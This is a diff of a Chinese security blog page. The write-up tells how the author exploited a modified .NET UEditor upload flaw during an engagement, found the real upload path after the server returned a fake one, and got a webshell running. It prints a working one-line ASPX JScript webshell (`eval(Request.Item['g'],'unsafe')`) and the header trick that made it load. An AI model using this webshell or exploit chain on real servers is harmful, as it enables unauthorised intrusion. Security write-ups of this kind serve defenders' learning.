@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.2k 字
+      876 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      10
        分钟
     </span>
   
@@ -230,41 +230,41 @@
               <p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p>
 <p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p>
 <p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/01.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <a id="more"></a>
 
 <p>通过fd抓包获取到编辑器路径为：</p>
 <p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p>
 <p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/02.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/02.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/03.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/03.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/04.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/04.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/05.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/05.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>打开这个js文件，找到了ueditor的真实路径。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/06.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/06.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>但是去访问的时候，发现地址无法访问。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/07.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/07.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/08.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/08.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/09.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/09.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/10.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/10.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/11.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/11.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p>
 <p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/12.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/12.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p>
 <p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/13.jpg)</p>
-<p>仔细一看，我tm，第一次返回的路径中那个’/‘哪来的，感情是给我返回了一个假路径给我，我就说配置文件看着哪里不对劲，原来是路径规则。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/14.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/13.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
+<p>仔细一看，第一次返回的路径中多了’/‘，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/14.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/15.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/15.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 <p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>
@@ -280,7 +280,7 @@
 &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre>
 
 <p>上传成功后，菜刀连接成功。</p>
-<p>![20191211_佛学的魔改.net Ueditor](/images/原创文章/20191211_佛学的魔改.net Ueditor/16.jpg)</p>
+<p><img src="/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/16.jpg" srcset="/img/loading.gif" alt="佛学的魔改Ueditor"></p>
 
             </div>
             <hr>
@@ -313,9 +313,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86">
+                      <a href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一次寻找接口的惨痛经历</span>
+                        <span class="hidden-mobile">Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
